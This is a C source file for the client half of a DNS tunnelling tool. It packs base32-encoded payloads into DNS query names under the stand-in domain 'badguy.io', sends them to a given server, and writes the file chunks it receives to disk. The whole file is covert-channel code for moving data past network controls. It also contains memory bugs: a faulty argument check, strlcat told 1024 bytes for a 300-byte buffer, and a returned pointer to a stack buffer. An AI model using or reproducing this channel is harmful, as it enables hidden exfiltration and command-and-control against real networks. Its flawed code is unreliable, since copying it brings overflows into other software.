#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <bsd/string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <uuid/uuid.h>
#include <sys/stat.h>

#include "base32.h"
#include "debug.h"
#include "dns.h"
#include "payload.h"

void usage(char **);
void get_ip_server(char *,char **);
void downloader(struct dns_payload *,char *);
void send_request(unsigned char *, size_t ,
                int , struct sockaddr_in);
void save_data(struct dns_query *);
struct dns_payload * get_respayload(struct dns_query *dns_query);

int main(int argc,char **argv) {
    // add argument
    if( argc < 3 && strcmp(argv[1],"--download") && strcmp(argv[1],"--upload"))
    {
        usage(argv);
        exit(-1);
    }
    // download 
    // send request action to download file A
    // prepare uuid 
    uuid_t session_id;
    uuid_generate_random(session_id);

    struct dns_payload payload;
    uuid_copy(payload.uuid, session_id);
    payload.sequence = 0;
    char uuid[256];
    char uuid2[256];
    uuid_unparse(payload.uuid, uuid);
    uuid_unparse(session_id, uuid2);
    printf("uuid: %s %s\n", uuid, uuid2);
    
    // prepare ip 
    char IPbuffer[100];
    get_ip_server(IPbuffer,argv);
    printf("IP: %s\n",IPbuffer);
    // prepare action
    int action = 0;
    if( !strcmp(argv[1],"--download"))
        action = 2;
    else action =1;
    printf("action: %d\n",action);
    if(action == 2)
        downloader(&payload,IPbuffer);
    // else if( action == 1)
    //     uploader(&payload);
    return 0;
}

void usage(char **args){
    printf("Usage: %s [OPTION]... [domain [domain name] | ip [ipserver]]\n\n",args[0]);
    printf("OPTION:\n");
    printf("\t--download\t\tDownload file A from server\n");
    printf("\t--upload [filename]\t\tUpload file to server");
}

void get_ip_server(char *ip,char **args){
    if( !strcmp(args[3],"domain"))
    {
        printf("domain : %s\n",args[4]);
        struct hostent *host = gethostbyname(args[4]);
        if (host) {
            struct in_addr **addr_list;
            addr_list = (struct in_addr **) host->h_addr_list;
	
            for(int i = 0; addr_list[i] != NULL; i++) 
            {
                //Return the first one;
                strcpy(ip , inet_ntoa(*addr_list[i]) );
                return;
            }
            return;
        } else {
            fprintf(stderr, "Unable to resolve %s\n", args[4]);
            exit(1);
        }
    }
    else if( !strcmp(args[3],"ip"))
    {
        strcpy(ip,args[4]);
        return;
    }
    else {
        usage(args);
        exit(1);
    }
}

void send_request(unsigned char *name_prefix_buf, size_t name_prefix_size,
                int sockfd, struct sockaddr_in sockaddr){
    unsigned char dns_buf[1024];
    memset(dns_buf, 0, 1024);

    struct dns_header *header = (struct dns_header *)dns_buf;
    header->id = htons(1337);
    header->rd = 1;
    header->qdcount = htons(1);
    
    unsigned char *dns_buf_ptr = dns_buf + sizeof(struct dns_header);
    int num_labels = name_prefix_size / 60 + (name_prefix_size % 60 ? 1 : 0);
    
    for (int i = 0; i < num_labels; ++i) {
        int start = i * 60;
        size_t count =
            (start + 60 <= name_prefix_size) ? 60 : name_prefix_size - start;
        
        *dns_buf_ptr = (unsigned char)count;
        memcpy(dns_buf_ptr + 1, name_prefix_buf + start, count);
        dns_buf_ptr += count + 1;
    }
    
    *dns_buf_ptr = (unsigned char)6;
    memcpy(dns_buf_ptr + 1, "badguy", 6);
    *(dns_buf_ptr + 7) = (unsigned char)2;
    memcpy(dns_buf_ptr + 8, "io", 2);
    
    *(dns_buf_ptr + 10) = (unsigned char)0;
    *((uint16_t *)(dns_buf_ptr + 11)) = htons(1);
    *((uint16_t *)(dns_buf_ptr + 13)) = htons(1);
    size_t buf_size = dns_buf_ptr + 15 - dns_buf;
    
    printf("Sent:\n");
    print_buffer(dns_buf, buf_size);
    if (sendto(sockfd, dns_buf, buf_size, MSG_CONFIRM,
             (struct sockaddr *)&sockaddr, sizeof(struct sockaddr_in)) == -1) {
        perror("sendto failed");
        exit(EXIT_FAILURE);
    }
}

void downloader(struct dns_payload *payload, char *ip){
    struct stat stat_info = {0};
    if (stat("./data", &stat_info) == -1) {
        mkdir("./data", 0777);
    }
    payload->action = 2;
    payload->length = 0;
    unsigned char base32_data_buf[256];
    printf("payload:\n");
    print_buffer((unsigned char *)payload, sizeof(struct dns_payload) - BLOCKSIZE);
    
    size_t num_written = base32_encode(
        (uint8_t *)payload,
        sizeof(struct dns_payload) - BLOCKSIZE,
        (uint8_t *)base32_data_buf,256
    );
    base32_data_buf[num_written] = '\0';

    // init socket 
    int sockfd;
    if((sockfd=socket(AF_INET,SOCK_DGRAM,0)) < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in sockaddr;
    struct in_addr ipaddr;
    if( !inet_aton(ip,&ipaddr) )
    {
        perror("Ip not correct.");;
        exit(EXIT_FAILURE);
    }
    sockaddr.sin_addr = ipaddr;
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(DNS_PORT);

    send_request(base32_data_buf, num_written, sockfd, sockaddr);
    unsigned char buffer[MAX_BUFFER_SIZE];
    for(;;){
        memset(buffer, 0, sizeof(buffer));
        socklen_t socklen = sizeof(struct sockaddr_in);
        int num_received = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE,
                                MSG_WAITALL, (struct sockaddr *)&sockaddr, &socklen);
        if(num_received == -1)
        {
            perror("receive failed");
            exit(EXIT_FAILURE);
        }
        print_buffer(buffer, num_received);
        // struct dns_header *header = (struct dns_header *)buffer;
        struct dns_query name_query;
        extract_dns_query(buffer, &name_query);
        struct dns_payload * res_payload = get_respayload(&name_query);
        if( res_payload->action == 3) {
            save_data(&name_query);
            // send response
            struct dns_payload req_payload;
            req_payload.action = res_payload->action;
            req_payload.length = res_payload->length;
            req_payload.sequence = res_payload->sequence;
            strncpy(req_payload.data,res_payload->data,res_payload->length);
            uuid_copy(req_payload.uuid,res_payload->uuid);
            size_t num_written = base32_encode((uint8_t *)&req_payload,
                                    sizeof(struct dns_payload) - BLOCKSIZE + req_payload.length,
                                    (uint8_t *)base32_data_buf,256);
            base32_data_buf[num_written] = '\0';
            send_request(base32_data_buf,num_written,sockfd,sockaddr);
        }
        if( res_payload->action == 0)
        {
            printf("action : 0\n");
            break;
        }
    }
    close(sockfd);
}
struct dns_payload * get_respayload(struct dns_query * dns_query)
{
    uint8_t base32_buf[300] = {0};
    for (int i = 0; i < dns_query->num_segments - 2; ++i) {
        strlcat((char *)base32_buf, dns_query->segment[i], 1024);
    }
    uint8_t payload_buf[300];
    base32_decode(base32_buf, payload_buf, 300);
    struct dns_payload *payload = (struct dns_payload *)payload_buf;
    printf("Payload\n");
    print_buffer(payload_buf, sizeof(struct dns_payload) - BLOCKSIZE);
    char uuid[256];
    uuid_unparse(payload->uuid, uuid);
    printf("uuid %s, action %d, sequence %d, length %d\n", uuid, payload->action, payload->sequence,
            payload->length);
    return payload;
}

void save_data(struct dns_query *dns_query)
{
    uint8_t base32_buf[300] = {0};
    for (int i = 0; i < dns_query->num_segments - 2; ++i) {
        strlcat((char *)base32_buf, dns_query->segment[i], 1024);
    }
    uint8_t payload_buf[300];
    base32_decode(base32_buf, payload_buf, 300);
    struct dns_payload *payload = (struct dns_payload *)payload_buf;
    FILE *fout = fopen("./data/test.txt", "a+b");
    fseek(fout, 120 * payload->sequence, 0);
    fwrite(payload->data, 1, payload->length, fout);
    fclose(fout);
    printf("Wrote %d bytes to %s at offset %d\n", payload->length, "./data/test.txt",
            payload->sequence * 120);
}

